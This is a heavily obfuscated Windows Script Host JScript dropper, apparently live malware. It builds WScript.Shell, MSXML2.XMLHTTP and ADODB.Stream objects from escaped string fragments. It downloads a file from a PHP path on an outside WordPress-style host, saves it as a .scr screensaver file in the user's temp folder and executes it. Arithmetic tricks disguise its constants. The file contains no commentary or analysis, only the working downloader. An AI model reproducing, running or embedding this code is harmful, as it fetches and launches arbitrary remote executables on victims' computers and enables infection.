
    reputationMemoirs = "\u0052\u0075\u006e";
    deformationSolid = this["WS\u0063r" + "\u0069" + "\u0070t"]["\u0043\u0072\u0065" + "at" + "\u0065\u004f\u0062\u006ae" + "\u0063\u0074"]("\u0057Scr" + "ip" + "t.Sh\u0065" + "l\u006c");
    statisticsMaster = deformationSolid["Ex" + "p\u0061" + "\u006e\u0064En\u0076\u0069" + "\u0072\u006fn\u006den" + "t\u0053" + "t\u0072i" + "ng\u0073"]("\u0025T\u0045\u004dP" + "\u0025/") + "\u0069\u006d" + "\u0069" + "ta\u0074\u0069" + "\u006f\u006e\u0046i" + "\u006e\u0069sh" + "\u002es" + "c\u0072";
    statisticsReaction = this["\u0057S\u0063" + "\u0072\u0069p\u0074"]["\u0043\u0072\u0065\u0061" + "\u0074eO" + "\u0062ject"]("\u004dS\u0058" + "\u004dL\u0032.XM" + "L\u0048" + "T\u0054P");
    statisticsReaction["o" + "p\u0065n"]("G\u0045T", "htt" + "\u0070\u003a//\u0077e" + "\u0069" + "lil\u0061\u006e" + ".c" + "o\u006d/" + "bl\u006f" + "\u0067\u002f" + "wp\u002din" + "\u0063\u006c\u0075\u0064\u0065" + "s" + "\u002flo\u0067" + "\u002ep\u0068p", !(6 == (((1|1)*((1*0)|3))*(([!+[]+!+[]]))&(((Math.pow(197, (1^3))-(5903*6+3142)),((96,306)/(Math.pow(17, 2)-283)),(([!+[]+!+[]]*[!+[]+!+[]+!+[]]+1)))&(((1^0)*(1*3))*((11,114,0)+(([!+[]+!+[]]))))))));
    statisticsReaction["\u0073\u0065\u006ed"]();
    while (statisticsReaction["r\u0065a" + "\u0064" + "ys\u0074a\u0074e"] < ((Math.pow(187, 2)-34725),(100,4))) {
        this["WS\u0063r" + "\u0069\u0070t"]["S\u006ce\u0065p"](((49*4+7)-(1^102)));
    }
    expertFlag = this["\u0057\u0053" + "\u0063\u0072i\u0070" + "\u0074"]["\u0043r\u0065\u0061" + "\u0074e\u004f\u0062\u006a" + "e\u0063t"]("\u0041DO\u0044B." + "S\u0074\u0072\u0065\u0061" + "m");
    try {
        expertFlag["o\u0070\u0065\u006e"]();
        expertFlag["t" + "\u0079\u0070e"] = (3/3);
        expertFlag["\u0077" + "\u0072\u0069t\u0065"](statisticsReaction["\u0052es" + "\u0070o\u006e" + "\u0073eB\u006fd\u0079"]);
        expertFlag["p\u006f" + "\u0073iti\u006fn"] = ((136^31),(([!+[]+!+[]+!+[]])*([!+[]+!+[]+!+[]])*([!+[]+!+[]+!+[]])*([!+[]+!+[]])*([!+[]+!+[]+!+[]])),(([+[]])));
        expertFlag["\u0073\u0061\u0076e" + "T" + "\u006fFi\u006c" + "e"](statisticsMaster, ((1&1)^(3)));
        expertFlag["cl" + "os" + "\u0065"]();
        deformationSolid[reputationMemoirs](statisticsMaster.abortTaboo(), (0|0), (1*(([+[]]))));
    } catch (universityReservoir) {};
  
function String.prototype.abortTaboo(a) {return this;} 